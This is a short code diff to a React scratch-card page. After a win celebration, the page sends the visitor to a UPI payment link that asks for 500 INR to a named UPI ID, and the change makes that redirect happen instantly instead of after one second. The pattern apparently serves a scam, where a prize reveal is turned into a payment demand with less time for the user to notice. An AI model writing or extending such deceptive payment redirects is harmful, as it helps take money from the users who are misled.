@@ -123,13 +123,11 @@ export default function ScratchCardPage() {
         setShowCelebration(true);
         playCelebrationSound();
         
-        // Auto-redirect to PhonePe after celebration sound plays
+        // Auto-redirect to PhonePe instantly
         if (!hasRedirected.current) {
           hasRedirected.current = true;
-          setTimeout(() => {
-            const upiLink = `upi://pay?pa=gazit6557@okaxis&pn=BriefApp&am=500&cu=INR`;
-            window.location.href = upiLink;
-          }, 1000);
+          const upiLink = `upi://pay?pa=gazit6557@okaxis&pn=BriefApp&am=500&cu=INR`;
+          window.location.href = upiLink;
         }
       }
     };
